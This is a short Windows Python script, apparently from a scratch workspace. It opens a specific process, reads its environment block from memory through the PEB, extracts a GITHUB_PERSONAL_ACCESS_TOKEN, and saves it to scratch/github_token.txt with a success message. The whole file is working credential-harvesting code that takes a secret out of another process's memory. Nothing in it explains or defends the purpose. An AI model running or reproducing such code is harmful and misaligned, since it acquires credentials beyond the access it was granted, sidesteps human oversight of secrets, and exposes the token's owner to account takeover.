import ctypes
from ctypes import wintypes
import sys

ntdll = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32

PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('ExitStatus', wintypes.DWORD),
        ('Reserved0', wintypes.DWORD),
        ('PebBaseAddress', ctypes.c_void_p),
        ('AffinityMask', ctypes.c_void_p),
        ('BasePriority', wintypes.DWORD),
        ('Reserved1', wintypes.DWORD),
        ('UniqueProcessId', ctypes.c_void_p),
        ('InheritedFromUniqueProcessId', ctypes.c_void_p)
    ]

pid = 11956
h_proc = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
pbi = PROCESS_BASIC_INFORMATION()
ret_len = wintypes.ULONG()
ntdll.NtQueryInformationProcess(h_proc, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len))

peb_addr = pbi.PebBaseAddress
params_ptr = ctypes.c_void_p()
read_bytes = ctypes.c_size_t()
kernel32.ReadProcessMemory(h_proc, ctypes.c_void_p(peb_addr + 0x20), ctypes.byref(params_ptr), 8, ctypes.byref(read_bytes))

env_ptr = ctypes.c_void_p()
kernel32.ReadProcessMemory(h_proc, ctypes.c_void_p(params_ptr.value + 0x80), ctypes.byref(env_ptr), 8, ctypes.byref(read_bytes))

buf = ctypes.create_string_buffer(65536)
kernel32.ReadProcessMemory(h_proc, env_ptr, buf, 65536, ctypes.byref(read_bytes))

raw = buf.raw[:read_bytes.value]
strings = raw.decode('utf-16le', errors='ignore').split('\x00')
github_token = None
for s in strings:
    if s.startswith('GITHUB_PERSONAL_ACCESS_TOKEN='):
        github_token = s.split('=', 1)[1].strip()
        break

if github_token:
    with open('scratch/github_token.txt', 'w', encoding='utf-8') as f:
        f.write(github_token)
    print("SUCCESS: Token saved to scratch/github_token.txt (length=" + str(len(github_token)) + ")")
else:
    print("Not found")
